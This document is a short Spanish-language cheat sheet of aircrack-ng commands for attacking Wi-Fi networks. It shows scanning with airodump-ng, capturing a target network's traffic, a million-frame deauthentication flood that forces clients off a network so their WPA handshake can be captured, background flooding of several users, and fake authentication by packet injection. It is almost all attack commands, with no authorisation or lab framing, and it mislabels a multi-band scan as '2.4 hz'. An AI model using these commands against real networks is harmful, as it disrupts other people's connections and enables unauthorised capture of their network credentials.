
# Con el siguiente comando escanearemos las redes de 2.4 hz

```bash
airodump-ng --band abg [NOMBREINTERFAZ]
```

# Asi lo usamos para olfatear una red en especifico, siempre ejecutarlo en algun directorio que creemos con el nombre de la red porque nos guarda varios archivos

```bash
airodump-ng --bssid FF:FF:FF:FF:FF:FF --channel [CANAL] --write test [NOMBREINTERFAZ]
```

# Con este ataque nos hacemos pasar por un dispositivo y hacemos como que queremos desconectarnos para qe lo echen de la red y capturar su handshake.

```bash
aireplay-ng --deauth 1000000 -a [BSSID] -c [STATION] wlan0
```

# Hacemos lo mismo pero a multiples usuarios en una red

```bash
aireplay-ng --deauth 1000000 -a [BSSID] -c [STATION] [NOMBREINTERFAZ] &>/dev/null&
```


# Para listar los trabajos

```bash
jobs
```

# Dejar de correrlos

```bash
kill
```

# Asi escaneamos por canal y guardamos la captura

```bash
airodump-ng --bssid [BSSID] --channel [CANAL] --write [NOMBREAGUARDAR] wlan0
```

## Para encontrar redes ocultas

# Autenticacion falsa con inyeccion de paquetes

```bash
aireplay-ng --fakeauth 0 -a [BSSID] -h [NUESTROMAC] [NOMBREINTERFAZ]
```
